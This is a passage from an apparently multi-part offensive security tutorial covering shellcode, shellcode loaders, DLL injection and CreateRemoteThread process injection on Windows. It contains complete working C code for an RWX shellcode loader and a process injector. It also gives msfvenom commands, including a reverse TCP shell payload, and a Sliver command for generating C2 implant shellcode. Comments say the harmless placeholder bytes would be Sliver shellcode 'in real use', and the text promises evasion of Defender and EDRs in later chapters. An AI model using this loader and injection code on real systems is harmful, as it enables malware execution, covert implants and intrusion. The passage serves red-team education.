This loads user32.dll, finds MessageBoxA, and calls it!

## DLL Injection

This is a key attack technique:

1. Load YOUR DLL into a target process
2. Your DLL's code runs inside that process
3. Now you have code execution in their process

```c
// Simplified concept (actual code is more complex)
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

// Allocate memory in target for DLL path
LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen, ...);

// Write DLL path to target
WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);

// Create thread in target that calls LoadLibrary with our path
CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, remotePath, 0, NULL);

// Now our DLL is loaded in the target process!
```

## Export and Import Tables

**Export Table:** Lists functions the DLL provides to others.
- `kernel32.dll` exports `CreateFile`, `VirtualAlloc`, etc.

**Import Table:** Lists functions the program needs from DLLs.
- `notepad.exe` imports `MessageBox` from `user32.dll`

When Windows loads a program, it reads the import table and fills in the addresses from each DLL's export table.

---

*End of Portion 6 - Chapters 21, 22, 23, 24, 25*

*What you learned:*
- *Process is an isolated environment for a program*
- *Thread is the actual execution path (one process can have many)*
- *Virtual memory gives each process its own address space*
- *Windows API is how we ask Windows to do things*
- *DLLs are shared libraries containing reusable code*

*Hands-on programs we wrote:*
- *Create a process (start notepad)*
- *List all processes*
- *Create threads*
- *Allocate memory with VirtualAlloc*
- *Find function addresses with GetProcAddress*
- *Load DLLs and call their functions*

*Next portion: Shellcode and Code Injection*

---

# PART 6: SHELLCODE AND CODE INJECTION

---

# CHAPTER 26: What is Shellcode

## Introduction

You have heard the word "shellcode" many times. Now let us understand what it actually is.

## Simple Definition

Shellcode is **just bytes** that, when executed by the CPU, do something useful (for the attacker).

That is it.

It is not magic. It is not special. It is just machine code - the same bytes that any program becomes after compilation.

## Why is it Called "Shellcode"?

Historically, the goal of early exploit payloads was to spawn a shell (command prompt).

If you got a shell, you could run any command. So the code that gave you a shell was called "shell code" → "shellcode".

Today, shellcode does much more than spawn shells. But the name stuck.

## What Makes Shellcode Different from a Normal Program?

Normal program (EXE):
- Has a PE header
- Has sections (.text, .data, etc.)
- Needs Windows to load it
- Has imports that Windows resolves

Shellcode:
- **No headers** - Just raw bytes
- **Position-independent** - Works no matter where in memory it is placed
- **Self-contained** - Finds its own API addresses
- **Usually small** - Just does one thing efficiently

## Example: The Simplest Possible Shellcode

Here is shellcode that does absolutely nothing (just returns):

```
C3
```

That is it. One byte. In assembly:

```asm
ret    ; Return to caller
```

If you execute this byte, the CPU will return from wherever it was called.

## Example: Shellcode That Exits Cleanly

This is still simple but does something:

```
31 C0    ; xor eax, eax     - Set EAX to 0 (exit code 0)
50       ; push eax         - Push 0 on stack (uExitCode parameter)
68 ?? ?? ?? ??  ; push address of ExitProcess
C3       ; ret              - "Return" to ExitProcess
```

This exits the program with code 0. (The ?? ?? ?? ?? would be replaced with the actual address of ExitProcess)

## What Sliver Shellcode Does

When Sliver generates shellcode, it creates bytes that:

1. Find the address of key functions (LoadLibrary, GetProcAddress)
2. Load any DLLs it needs (like ws2_32.dll for networking)
3. Create a network connection back to your C2 server
4. Set up an encrypted communication channel
5. Wait for commands and execute them

All of this is packed into the shellcode bytes.

## How Big is Shellcode?

**Tiny shellcode:** 50-200 bytes
- Simple tasks like spawning calc.exe or popping a message box

**Medium shellcode:** 500-2000 bytes
- Reverse shell, download and execute

**Sliver shellcode:** 50,000+ bytes
- Full implant with encryption, evasion, multiple protocols

## Where Does Shellcode Come From?

**Option 1: Generate with tools**
- Sliver: `generate --mtls <ip>:<port> --format shellcode`
- msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f c`
- Cobalt Strike: Attacks → Packages → Windows Executable (S)

**Option 2: Write it yourself**
- Write in assembly
- Assemble to bytes
- This is for small, custom payloads

---

# CHAPTER 27: How Shellcode is Written

## Introduction

Let us understand how shellcode is actually created. This will help you understand what Sliver gives you.

## The Challenge: Position Independence

When you compile a normal program, addresses are fixed. The program says "call function at 0x00401234".

But shellcode does not know where it will be placed in memory. Maybe at 0x00010000, maybe at 0x7FFE1234.

If it uses fixed addresses, it will crash when placed somewhere else.

**Solution:** Shellcode must find addresses at runtime.

## Finding Kernel32.dll

Almost all Windows shellcode needs functions from kernel32.dll.

How does shellcode find kernel32.dll?

**Method: Walk the PEB (Process Environment Block)**

Every Windows process has a PEB structure. The PEB contains a list of loaded modules (DLLs).

Shellcode walks this list to find kernel32.dll:

```asm
; Get PEB address (stored in GS register on x64)
mov rax, gs:[0x60]           ; RAX = PEB address

; Get PEB_LDR_DATA
mov rax, [rax + 0x18]        ; RAX = PEB->Ldr

; Get first module in list
mov rax, [rax + 0x20]        ; RAX = InMemoryOrderModuleList

; Walk list to find kernel32.dll
; (skip ntdll, skip exe, find kernel32)
mov rax, [rax]               ; Second entry
mov rax, [rax]               ; Third entry (usually kernel32)
mov rax, [rax + 0x20]        ; DllBase of kernel32
```

Now RAX contains the address where kernel32.dll is loaded!

## Finding Functions: GetProcAddress

Once we have kernel32.dll, we need to find functions like LoadLibrary and GetProcAddress.

Shellcode reads kernel32.dll's export table:

1. Find the PE header in kernel32
2. Find the export directory
3. Walk the list of exported function names
4. Compare each name to "GetProcAddress"
5. When found, get the function address

This is complex, but it works no matter where kernel32 is loaded.

## Example: Simple MessageBox Shellcode (Concept)

Here is the logic (simplified):

```
1. Find kernel32.dll base address
2. Find GetProcAddress function
3. Use GetProcAddress to find LoadLibraryA
4. LoadLibraryA("user32.dll") - now user32 is loaded
5. GetProcAddress(user32, "MessageBoxA") - get MessageBoxA address
6. Call MessageBoxA(NULL, "Hello", "Title", MB_OK)
7. Exit or return
```

When assembled, this becomes something like:

```
\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x10\x48\x89\x74\x24\x18\x57
\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x48
... (many more bytes)
```

## Avoiding Bad Characters

Some situations do not allow certain bytes in shellcode:

**Null bytes (0x00):** Many string functions stop at 0x00
**Newlines (0x0A, 0x0D):** HTTP headers cannot contain these
**Other characters:** Depends on the vulnerability

Shellcode writers use tricks to avoid these:
- `xor eax, eax` instead of `mov eax, 0` (avoids 0x00000000)
- Encoding/decoding stubs
- Different instruction sequences that produce the same result

## Hands-On: Look at msfvenom Shellcode

On your Kali machine:

```bash
msfvenom -p windows/x64/messagebox TEXT="Hello" TITLE="Test" -f c
```

Output:
```c
unsigned char buf[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
...
```

Each `\xfc` is one byte. This is shellcode that will pop a message box.

---

# CHAPTER 28: What is a Shellcode Loader

## Introduction

Shellcode is just bytes. It cannot run by itself like an .exe file.

You need a **loader** - a program that:
1. Puts the shellcode in memory
2. Makes that memory executable
3. Jumps to the shellcode (runs it)

## The Simplest Loader

```c
#include <windows.h>
#include <stdio.h>

// Shellcode bytes go here
unsigned char shellcode[] = 
"\x90\x90\x90\x90"   // NOP NOP NOP NOP (placeholder)
"\xcc"               // INT3 (breakpoint - will crash debugger)
"\xc3";              // RET (return)

int main() {
    printf("Shellcode size: %d bytes\n", sizeof(shellcode));
    printf("Shellcode at: %p\n", shellcode);
    
    // Step 1: Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(
        NULL,                           // Any address
        sizeof(shellcode),              // Size
        MEM_COMMIT | MEM_RESERVE,       // Allocate it
        PAGE_EXECUTE_READWRITE          // RWX permissions
    );
    
    if (exec_mem == NULL) {
        printf("VirtualAlloc failed\n");
        return 1;
    }
    
    printf("Executable memory at: %p\n", exec_mem);
    
    // Step 2: Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    printf("Shellcode copied\n");
    
    // Step 3: Execute the shellcode
    printf("Executing shellcode...\n");
    
    // Cast the memory address to a function pointer and call it
    ((void(*)())exec_mem)();
    
    printf("Shellcode returned\n");
    
    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}
```

Compile:
```
cl loader.c
```

## What Each Step Does

**Step 1: VirtualAlloc**
- Allocates fresh memory
- PAGE_EXECUTE_READWRITE means we can write to it AND execute it
- This is the key - normally data memory is not executable

**Step 2: memcpy**
- Copies our shellcode bytes into the executable memory
- Now the bytes are sitting in memory with execute permission

**Step 3: Execute**
- `((void(*)())exec_mem)()` is ugly but simple
- It says: "Treat exec_mem as a function pointer and call it"
- The CPU now executes our shellcode bytes

## Hands-On: Real MessageBox Shellcode

Let us use real shellcode. Generate on Kali:

```bash
msfvenom -p windows/x64/messagebox TEXT="Hacked!" TITLE="Red Team" -f c
```

Copy the output bytes and paste into the loader:

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
// ... paste all the bytes here
;

int main() {
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode), 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    ((void(*)())exec_mem)();
    
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
```

Compile and run - you should see a message box!

## Why Defender Will Catch This

If you try this with Sliver shellcode, Defender will probably catch it.

Why?
1. **Signature detection:** Defender knows what Sliver shellcode looks like
2. **Behavioral detection:** Allocating RWX memory and executing it is suspicious
3. **AMSI:** If using PowerShell, AMSI scans the content

This is why we need evasion techniques (coming in later chapters).

---

# CHAPTER 29: What is Process Injection

## Introduction

Running shellcode in your own process works, but has problems:
- If the user closes your program, the shellcode dies
- Investigation finds your suspicious program easily
- Some shellcode needs to be in a specific process

**Solution:** Inject shellcode into another process!

## What Process Injection Means

Instead of running shellcode in your own process, you:
1. Pick a target process (like notepad.exe or explorer.exe)
2. Allocate memory in THAT process
3. Write shellcode to THAT process
4. Create a thread in THAT process that runs the shellcode

Now the shellcode runs inside notepad! If someone investigates, they see notepad acting strangely.

## Classic Process Injection Steps

```
┌─────────────────────┐      ┌─────────────────────┐
│   YOUR PROCESS      │      │   TARGET PROCESS    │
│   (injector.exe)    │      │   (notepad.exe)     │
│                     │      │                     │
│  1. OpenProcess() ──────────→ Get handle         │
│                     │      │                     │
│  2. VirtualAllocEx() ───────→ Allocate memory   │
│                     │      │   in target         │
│                     │      │                     │
│  3. WriteProcessMemory() ───→ Copy shellcode    │
│                     │      │   to target         │
│                     │      │                     │
│  4. CreateRemoteThread() ───→ Run shellcode!    │
│                     │      │                     │
└─────────────────────┘      └─────────────────────┘
```

## Hands-On: Process Injection in C

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// For this example, we use harmless shellcode (NOP NOP RET)
// In real use, this would be Sliver shellcode
unsigned char shellcode[] = "\x90\x90\x90\xc3";

// Find process ID by name
DWORD GetProcessIdByName(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return 0;
}

int main() {
    // Step 1: Find target process
    DWORD targetPID = GetProcessIdByName("notepad.exe");
    
    if (targetPID == 0) {
        printf("Could not find notepad.exe. Please open it first.\n");
        return 1;
    }
    
    printf("Found notepad.exe with PID: %d\n", targetPID);
    
    // Step 2: Open the target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,  // We need full access
        FALSE,               // Don't inherit handle
        targetPID
    );
    
    if (hProcess == NULL) {
        printf("OpenProcess failed. Error: %d\n", GetLastError());
        return 1;
    }
    
    printf("Opened process successfully\n");
    
    // Step 3: Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,                       // Target process
        NULL,                           // Let Windows choose address
        sizeof(shellcode),              // Size
        MEM_COMMIT | MEM_RESERVE,       // Allocate it
        PAGE_EXECUTE_READWRITE          // RWX
    );
    
    if (remoteBuffer == NULL) {
        printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("Allocated memory in target at: %p\n", remoteBuffer);
    
    // Step 4: Write shellcode to the target process
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(
        hProcess,           // Target process
        remoteBuffer,       // Destination
        shellcode,          // Source
        sizeof(shellcode),  // Size
        &bytesWritten       // How many bytes written
    );
    
    if (!success) {
        printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("Wrote %zu bytes to target\n", bytesWritten);
    
    // Step 5: Create a thread in the target that executes our shellcode
    HANDLE hRemoteThread = CreateRemoteThread(
        hProcess,           // Target process
        NULL,               // Default security
        0,                  // Default stack size
        (LPTHREAD_START_ROUTINE)remoteBuffer,  // Start address = our shellcode
        NULL,               // No parameters
        0,                  // Run immediately
        NULL                // Don't need thread ID
    );
    
    if (hRemoteThread == NULL) {
        printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    
    printf("Created remote thread successfully!\n");
    printf("Shellcode is now running in notepad.exe!\n");
    
    // Wait for thread to complete (optional)
    WaitForSingleObject(hRemoteThread, INFINITE);
    
    // Cleanup
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    printf("Done.\n");
    return 0;
}
```

## Try It:

1. Open notepad.exe
2. Compile the injection program: `cl injector.c`
3. Run it: `injector.exe`
4. It injects into notepad!

With the harmless shellcode (NOP NOP RET), notepad will not visibly do anything. But the shellcode ran inside notepad's process.

## Why This Technique is Powerful

- Shellcode runs in a legitimate process
- Harder to detect (it is just notepad doing "something")
- Survives if your injector program closes
- Can inject into higher privileged processes

## Why This Gets Detected

- OpenProcess with PROCESS_ALL_ACCESS is suspicious
- VirtualAllocEx allocating RWX memory is suspicious
- CreateRemoteThread is heavily monitored by EDRs

Modern evasion uses different techniques:
- APC injection (QueueUserAPC)
- Thread hijacking
- Direct syscalls to avoid hooks
- Unhooking ntdll

We cover evasion in the next chapters.

---

*End of Portion 7 - Chapters 26, 27, 28, 29*

*What you learned:*
- *Shellcode is just machine code bytes that run when executed*
- *Shellcode must find API addresses at runtime (position independent)*
- *A loader allocates executable memory, copies shellcode, and jumps to it*
- *Process injection runs shellcode inside another process*
- *CreateRemoteThread is the classic injection method*

*Hands-on code we wrote:*
- *Simple shellcode loader*
- *Process injection - inject into notepad.exe*

*Next portion: Command and Control with Sliver*

---
